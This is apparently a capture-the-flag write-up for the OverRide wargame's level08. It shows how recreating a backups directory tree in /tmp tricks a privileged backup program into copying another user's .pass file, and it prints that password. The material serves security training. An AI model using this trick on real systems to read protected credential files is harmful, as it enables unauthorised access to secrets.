# Level08 Exploit

## Steps

### 1. Program Behavior

Run the program to observe its behavior:

```bash
level08@OverRide:~$ ./level08
Usage: ./level08 .pass
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

### 2. Vulnerability Discovery

The program attempts to create a backup of the given file but doesn't properly sanitize the input path. It prepends "./backups/" to the given filename.

### 3. Exploiting the Vulnerability

Create the necessary directory structure in /tmp:

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
```

### 4. Executing the Exploit

Run the program from /tmp, specifying the target file:

```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
```

### 5. Accessing the Next Level

Retrieve the password from the created backup:

```bash
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## Explanation

This exploit takes advantage of the program's lack of path sanitization. By creating a mirror of the expected directory structure in /tmp, we trick the program into copying the password file to a location we can access. The program runs with elevated privileges, allowing it to read the target file, and then creates a backup in our accessible location.